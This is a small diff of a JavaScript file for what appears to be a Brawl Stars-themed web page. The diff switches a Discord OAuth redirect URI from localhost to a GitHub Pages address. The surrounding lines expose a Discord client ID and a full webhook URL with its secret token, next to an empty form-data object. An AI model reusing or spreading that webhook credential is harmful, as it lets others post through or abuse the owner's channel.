@@ -1,5 +1,5 @@
 const clientId = "739120842663002222";
-const redirectUri = "http://localhost:5500";
+const redirectUri = "https://yanissska.github.io/brawlstarspng";
 const webhookUrl = "https://discord.com/api/webhooks/1340320359848874056/rda9JXS13z1Czv7XHtg-I4LnIwWtmjww05G-eY2N1IpTfla0eA3GQ3UC5FCYXkqvBN36";
 
 let formData = {};
